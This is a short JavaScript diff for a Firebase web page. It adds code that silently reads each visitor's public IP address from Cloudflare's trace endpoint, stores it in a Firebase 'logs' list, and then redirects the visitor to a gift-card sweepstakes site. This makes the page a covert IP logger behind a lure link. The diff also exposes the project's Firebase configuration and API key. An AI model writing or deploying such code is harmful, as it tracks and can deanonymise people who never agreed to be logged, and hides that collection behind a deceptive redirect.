@@ -4,7 +4,7 @@
 var firebaseConfig = {
     apiKey: "AIzaSyCw9KvJkWqIyOZiilmoG3VRMUX1kKi9iEs",
     authDomain: "fb-test-ed5c6.firebaseapp.com",
-    databaseURL: "https://fb-test-ed5c6.firebaseio.com",
+    databaseURL: "https://fb-test-ed5c6-default-rtdb.firebaseio.com/",
     projectId: "fb-test-ed5c6",
     storageBucket: "fb-test-ed5c6.appspot.com",
     messagingSenderId: "182391110006",
@@ -15,9 +15,15 @@ var firebaseConfig = {
 
   // Get a reference to the database service
   var database = firebase.database();
-  firebase.database().ref('logs/').set(["123.456.789.012"]);
-  var logs = firebase.database().ref('logs/');
-//   console.log(logs);
-  firebase.database().ref('/').once('value', function(snap){
-    console.log(snap);
+  const logsref = firebase.database().ref('logs/');
+  logsref.once("value", function(snapshot) {
+    var logs = snapshot.val();
+    $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
+      const ip = data.split("\n")[2].split("=")[1];
+      if (!logs.includes(ip)) {
+        logs.push(ip);
+        logsref.set(logs);
+      }
+    })
   });
+  window.location.replace("https://sweepstakesfanatics.com/gift-card-sweepstakes/");
